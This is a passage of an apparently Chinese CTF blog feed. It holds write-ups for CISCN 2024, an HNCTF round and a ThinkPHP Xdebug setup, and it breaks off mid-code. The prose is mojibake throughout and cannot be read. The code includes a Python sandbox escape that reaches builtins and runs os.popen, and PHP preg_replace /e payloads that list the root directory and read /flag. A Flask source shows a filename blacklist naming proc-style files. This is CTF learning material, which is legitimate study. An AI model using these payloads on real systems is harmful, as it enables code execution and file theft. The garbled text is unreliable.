â€˜quitâ€™, â€˜rangeâ€™, â€˜reprâ€™, â€˜reversedâ€™, â€˜roundâ€™, â€˜setâ€™, â€˜setattrâ€™, â€˜sliceâ€™, â€˜sortedâ€™, â€˜staticmethodâ€™, â€˜strâ€™, â€˜sumâ€™, â€˜superâ€™, â€˜tupleâ€™, â€˜typeâ€™, â€˜varsâ€™, â€˜zipâ€™<code>é¦–å…ˆæˆ‘ä»¬è¦å¾—åˆ°dirè¿™ä¸ªå‡½æ•°å¯ä»¥æŸ¥çœ‹ä¸€ä¸ªå¯¹è±¡åŒ…å«çš„æ–¹æ³•å±æ€§å˜é‡ç­‰<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="built_in">dir</span>=builtins.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(<span class="built_in">globals</span>))</span><br></pre></td></tr></table></figure>å¦‚ä¸Šæˆ‘ä»¬å¯ä»¥å¾—åˆ°å…¨å±€å˜é‡çš„ä½¿ç”¨æ–¹æ³•å±æ€§ç­‰ï¼Œå¦‚æœå…¶æœ‰åŒ…å«evalç­‰å‡½æ•°å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä½†æ˜¯è¿™é¢˜æ˜¯æ²¡æœ‰çš„æˆ‘åœ¨å¤ç°çš„æ—¶å€™æœ‰å°è¯•é€šè¿‡</code></strong>builtins<strong><code>æ¥è·å–evalä¹‹åå°è¯•å‘½ä»¤æ‰§è¡Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— æ³•æ‰§è¡Œä»£ç å¦‚ä¸‹<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  </span><br><span class="line">    <span class="comment">#frame = next(g) </span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="built_in">dir</span>=builtins.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">eval</span>=builtins.<span class="built_in">eval</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">&quot;_&quot;</span><span class="string">&quot;_import_&quot;</span><span class="string">&quot;_(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>å‘½ä»¤æ‰§è¡Œå¹¶ä¸å›æ˜¾è€Œä¸”ping dnslogæœåŠ¡å™¨ä¹Ÿæ— æ³•pingé€šã€‚æ‰€æœ‰æ”¾å¼ƒè¿™ä¸ªæ–¹æ³•ä½†æ˜¯æˆ‘ä»¬çœ‹æºç ä¼šå‘ç°å…¶å­˜åœ¨ä¸€ä¸ªæ“ä½œ<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br></pre></td></tr></table></figure>å…¶å°†flagå˜é‡ä¹‹é—´æ›¿æ¢runneræ–‡ä»¶çš„THIS_IS_SEEDï¼Œè¿™å°±å¯¼è‡´äº†flagçš„å€¼å˜æˆäº†å¸¸é‡ï¼Œå¯ä»¥é€šè¿‡è¾“å‡ºco_constsæ¥å¾—åˆ°flagçš„å€¼ã€‚co_constsä½¿ç”¨ä¸€ä¸ªå­˜å‚¨äº†å…¨å±€æ‰€æœ‰å‡ºç°çš„å­—é¢å¸¸é‡çš„å€¼ã€‚&#123;% asset_img "12.png" "alt text" %&#125;é‚£ä¹ˆæˆ‘ä»¬åªè¦è¾“å‡ºco_constså°±å¯ä»¥å¾—åˆ°flagæˆ‘ä»¬ä½¿ç”¨f_codeæ¥å¾—åˆ°ä»£ç å¯¹è±¡ï¼Œåœ¨é€šè¿‡ä»£ç å¯¹è±¡æ¥å¾—åˆ°co_consts<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>)</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="built_in">dir</span>=builtins.<span class="built_in">dir</span></span><br><span class="line">    flag=frame.f_back.f_back.f_back.f_code</span><br><span class="line">    <span class="built_in">print</span>(flag.co_consts)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>ä½†æ˜¯ç”±äºç¨‹åºå¯¹è¾“å‡ºæœ‰ä¸€ä¸ªåˆ¤æ–­<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;è¿™ runtime ä½ å°±å˜å˜å†™å§ï¼Œ ä¸€å†™ä¸€ä¸ªä¸å±å£°å•Šï¼Œç‚¹å„¿éƒ½æ²¡æ‹¦ä½ï¼&quot;</span>)</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br></pre></td></tr></table></figure>ç”±äºæˆ‘ä»¬è¾“å‡ºçš„æ˜¯å…¨å±€çš„å¸¸æ•°æ‰€ä»¥ä¼šè¾“å‡ºTHIS_IS_SEEDå¯¼è‡´æ— æ³•é€šè¿‡æ£€æµ‹ã€‚æˆ‘ä»¬éœ€è¦åšè¿›ä¸€æ­¥å¤„ç†é€šè¿‡</code></strong>builtins_</em>`ä¸‹çš„stræ¥å°†flag.co_constså¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦è¾“å‡ºï¼Œå­—ç¬¦ä¹‹é—´ä»¥ç©ºæ ¼åˆ†å‰²ä»£ç å¦‚ä¸‹<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    builtins=<span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span><span class="string">&quot;_builtins_&quot;</span><span class="string">&quot;_&quot;</span>]</span><br><span class="line">    flag=frame.f_back.f_back.f_back.f_code.co_consts</span><br><span class="line">    <span class="built_in">str</span>=builtins.<span class="built_in">str</span></span><br><span class="line">    flag=<span class="built_in">str</span>(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure><br>å¾—åˆ°flag<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/15.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>think_php3.2.3çš„ç®€å•å®¡è®¡åŠ¨è°ƒ</title>
      <link href="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/"/>
      <url>/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/</url>
      
        <content type="html"><![CDATA[<h1 id="å› ä¸ºåœ¨æ‰“hnctfçš„æ—¶å€™é‡åˆ°äº†æ¡†æ¶ä»£å®¡ï¼Œå½“æ—¶æˆ‘æ˜¯ç›´æ¥é€šè¿‡æ—¥å¿—æ³„éœ²çš„payloadæ¥æ‰“çš„ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•ä¸€ä¸‹ä»£å®¡ï¼Œé¡ºä¾¿å®‰è£…ä¸€ä¸‹åŠ¨è°ƒçš„ç¯å¢ƒã€‚"><a href="#å› ä¸ºåœ¨æ‰“hnctfçš„æ—¶å€™é‡åˆ°äº†æ¡†æ¶ä»£å®¡ï¼Œå½“æ—¶æˆ‘æ˜¯ç›´æ¥é€šè¿‡æ—¥å¿—æ³„éœ²çš„payloadæ¥æ‰“çš„ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•ä¸€ä¸‹ä»£å®¡ï¼Œé¡ºä¾¿å®‰è£…ä¸€ä¸‹åŠ¨è°ƒçš„ç¯å¢ƒã€‚" class="headerlink" title="å› ä¸ºåœ¨æ‰“hnctfçš„æ—¶å€™é‡åˆ°äº†æ¡†æ¶ä»£å®¡ï¼Œå½“æ—¶æˆ‘æ˜¯ç›´æ¥é€šè¿‡æ—¥å¿—æ³„éœ²çš„payloadæ¥æ‰“çš„ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•ä¸€ä¸‹ä»£å®¡ï¼Œé¡ºä¾¿å®‰è£…ä¸€ä¸‹åŠ¨è°ƒçš„ç¯å¢ƒã€‚"></a>å› ä¸ºåœ¨æ‰“hnctfçš„æ—¶å€™é‡åˆ°äº†æ¡†æ¶ä»£å®¡ï¼Œå½“æ—¶æˆ‘æ˜¯ç›´æ¥é€šè¿‡æ—¥å¿—æ³„éœ²çš„payloadæ¥æ‰“çš„ï¼Œæ‰€ä»¥æˆ‘å†™ä¸‹è¿™ç¯‡æ–‡ç« æ¥è®°å½•ä¸€ä¸‹ä»£å®¡ï¼Œé¡ºä¾¿å®‰è£…ä¸€ä¸‹åŠ¨è°ƒçš„ç¯å¢ƒã€‚</h1><h1 id="xdebugçš„é…ç½®"><a href="#xdebugçš„é…ç½®" class="headerlink" title="xdebugçš„é…ç½®"></a>xdebugçš„é…ç½®</h1><p>å…ˆé€šè¿‡phpinfoæ¥çœ‹å…¶æ¨èç‰ˆæœ¬</p><p><a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a><br><img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120050236.png" class=""><br>å°†phpinfoä¿¡æ¯å¤åˆ¶ï¼Œå®˜ç½‘ä¼šæ¨èå…¶ç‰ˆæœ¬<br><img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120234318.png" class=""><br>è·Ÿç€å®‰è£…å³å¯<br>é…ç½®å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension=&quot;D:\phpstudy_pro\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.client_port = 9001      ;ç«¯å£é…ç½®</span><br><span class="line">xdebug.remote_host = localhost  ;è¿œç¨‹ä¸»æœºåŸŸå,å¯¹åº”æœ¬åœ°phpstudyçš„ç½‘ç«™åŸŸå</span><br><span class="line">xdebug.idekey               = PHPSTORM      ;è®¾ç½®IDE KEY</span><br><span class="line">xdebug.auto_trace           = On            ;å¼€å¯è‡ªåŠ¨è·Ÿè¸ª,è¯¥åŠŸèƒ½å¯ä»¥åœ¨ä½ æŒ‡å®šçš„ç›®å½•ä¸­å°†å‡½æ•°è°ƒç”¨çš„ç›‘æµ‹ä¿¡æ¯ä»¥æ–‡ä»¶çš„å½¢å¼è¾“å‡º</span><br><span class="line">xdebug.show_exception_trace = On            ;å¼€å¯å¼‚å¸¸è·Ÿè¸ª</span><br><span class="line">xdebug.remote_autostart     = On            ;å¼€å¯è¿œç¨‹è°ƒè¯•è‡ªåŠ¨å¯åŠ¨</span><br><span class="line">xdebug.collect_vars         = On            ;æ”¶é›†å˜é‡</span><br><span class="line">xdebug.collect_return       = On            ;æ”¶é›†è¿”å›å€¼</span><br><span class="line"> xdebug.mode = debug ;å¿…é¡»åŠ å…¥,å¦åˆ™æ— æ³•è¿›å…¥æ–­ç‚¹è°ƒè¯•</span><br><span class="line">xdebug.collect_params       = On            ;æ”¶é›†å‚æ•°</span><br><span class="line">xdebug.show_local_vars      = On            ;æ˜¾ç¤ºå±€éƒ¨å˜é‡</span><br><span class="line">xdebug.default_enable       = On            ;æ˜¾ç¤ºé»˜è®¤çš„é”™è¯¯ä¿¡æ¯</span><br><span class="line">xdebug.remote_handler       = dbgp          ;ç”¨äºzend studioè¿œç¨‹è°ƒè¯•çš„åº”ç”¨å±‚é€šä¿¡åè®®</span><br><span class="line">xdebug.max_nesting_level    = 10000         ;å¦‚æœè®¾å¾—å¤ªå°,å‡½æ•°ä¸­æœ‰é€’å½’è°ƒç”¨è‡ªèº«æ¬¡æ•°å¤ªå¤šæ—¶ä¼šæŠ¥è¶…è¿‡æœ€å¤§åµŒå¥—æ•°é”™</span><br></pre></td></tr></table></figure></p><h2 id="é…ç½®Xdebugè§£é‡Šå™¨"><a href="#é…ç½®Xdebugè§£é‡Šå™¨" class="headerlink" title="é…ç½®Xdebugè§£é‡Šå™¨"></a>é…ç½®Xdebugè§£é‡Šå™¨</h2><img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120355911.png" class="">  <h2 id="é…ç½®sever"><a href="#é…ç½®sever" class="headerlink" title="é…ç½®sever"></a>é…ç½®sever</h2><img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120343140.png" class="">  <img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120325615.png" class="">  <img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120412546.png" class="">  <p>äºå‰é¢php.inié…ç½®å®¢æˆ·ç«¯å£ç›¸åŒ</p><h2 id="ç¼–è¾‘webpage"><a href="#ç¼–è¾‘webpage" class="headerlink" title="ç¼–è¾‘webpage"></a>ç¼–è¾‘webpage</h2><img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120519903.png" class="">  <img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120623085.png" class="">  <img src="/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/IMG_20241129-120720015.png" class="">  <h1 id="expæ³¨å…¥"><a href="#expæ³¨å…¥" class="headerlink" title="expæ³¨å…¥"></a>expæ³¨å…¥</h1>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> å¾…å®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hnctf wp</title>
      <link href="/2024/05/13/hnctf-wp/"/>
      <url>/2024/05/13/hnctf-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘¨æœ«æ‰“äº†ä¸€ä¸‹hnctfï¼Œç¨å¾®å†™ä¸€ä¸‹wpå§ã€‚å†™äº†äº”é“webã€‚"><a href="#å‘¨æœ«æ‰“äº†ä¸€ä¸‹hnctfï¼Œç¨å¾®å†™ä¸€ä¸‹wpå§ã€‚å†™äº†äº”é“webã€‚" class="headerlink" title="å‘¨æœ«æ‰“äº†ä¸€ä¸‹hnctfï¼Œç¨å¾®å†™ä¸€ä¸‹wpå§ã€‚å†™äº†äº”é“webã€‚"></a>å‘¨æœ«æ‰“äº†ä¸€ä¸‹hnctfï¼Œç¨å¾®å†™ä¸€ä¸‹wpå§ã€‚å†™äº†äº”é“webã€‚</h1><h1 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ°äº†preg_replace,é‚£ä¹ˆè¿™é‡Œå°±å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬ä¼šå‘ç°å…¶ç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ã€‚ä½†æ˜¯æ²¡æœ‰ç¦scandirå’Œhighlight_fileï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ¥è¯»æ–‡ä»¶ã€‚<br>è€Œstr2çš„æ­£åˆ™æ˜¯å¯¹å¤§å°å†™æ•æ„Ÿçš„ã€‚è€Œpreg_replaceç”¨äº†iä¿®é¥°ç¬¦ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">task=print_r(scandir(chr(47)));&amp;flag=please_give_me_flaG #æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Cookie:PHPSESSID=/flag</span><br><span class="line">task=highlight_file(session_id(session_start()));&amp;flag=please_give_me_flaG #è¯»å–flag</span><br></pre></td></tr></table></figure></p><h1 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span 